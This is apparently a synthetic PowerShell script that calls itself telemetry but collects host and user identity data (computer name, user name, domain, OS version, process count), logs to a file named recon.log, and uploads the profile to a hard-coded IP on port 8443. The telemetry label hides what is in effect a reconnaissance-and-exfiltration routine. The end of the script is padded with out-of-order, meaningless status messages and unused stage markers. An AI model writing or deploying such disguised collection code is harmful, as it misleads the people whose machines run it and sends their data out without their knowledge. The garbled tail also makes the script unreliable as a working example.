<#
.SYNOPSIS
    Telemetry collection and HTTP upload workflow.

.DESCRIPTION
    Builds a compact host profile from environment variables and
    operating-system metadata, writes it as JSON and uploads it
    with a bounded retry loop.

.NOTES
    Only host metadata is included.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUrl = "https://203.0.113.155:8443/upload",
    [string]$ReportPath = "$env:TEMP\stage_report.json",
    [string]$StageLog = "$env:TEMP\recon.log",
    [int]$TimeoutSec = 77
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $StageLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Profile
function Get-SystemProfile {
    $Profile = [ordered]@{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        Domain = $env:USERDOMAIN
        OSVersion = [Environment]::OSVersion.VersionString
        ProcessCount = (Get-Process).Count
    }
    return $Profile
}

# Uploader
function Send-StageReport {
    param(
        [string]$EndpointUrl = '',
        [string]$BodyPath = "",
        [int]$RetryCount = 3
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $Body = Get-Content -Path $BodyPath -Raw
            return Invoke-RestMethod -Uri $EndpointUrl -Method Post -Body $Body -ContentType "application/json" -TimeoutSec 77
        }
        catch {
            Write-Verbose ("Upload attempt " + $Attempt + " failed")
            Start-Sleep -Seconds 3
        }
    }
    return $null
}

try {
    Write-StageLog -Message "Starting telemetry upload"
    $FetchResult = Get-SystemProfile
    $FetchResult | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
    $UploadResult = Send-StageReport -EndpointUrl $TargetUrl -BodyPath $ReportPath -RetryCount 3
    Write-StageLog -Message ("Upload result: " + $UploadResult)
}
catch {
    Write-Warning "Telemetry workflow failed: $($_.Exception.Message)"
}

$TelemetryReport = [ordered]@{
    Stage = "upload"
    Endpoint = $TargetUrl
    ReportPath = $ReportPath
    TimeoutSec = $TimeoutSec
}
$TelemetryReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Operation completed"
Write-Verbose "Collecting host metadata"
Write-Verbose "Applying operation timeout"
Write-Verbose "Stage handoff finished"
Write-Verbose "Inspecting process list"
Write-Verbose "Resolving configured target"
Write-Verbose "Exporting operation report"
Write-Verbose "Validating result"
Write-Verbose "Starting workflow"
$StageMarker = "stage-15"
Write-Verbose "stage marker 34 reached"
Write-Output "stage 16 initialized"
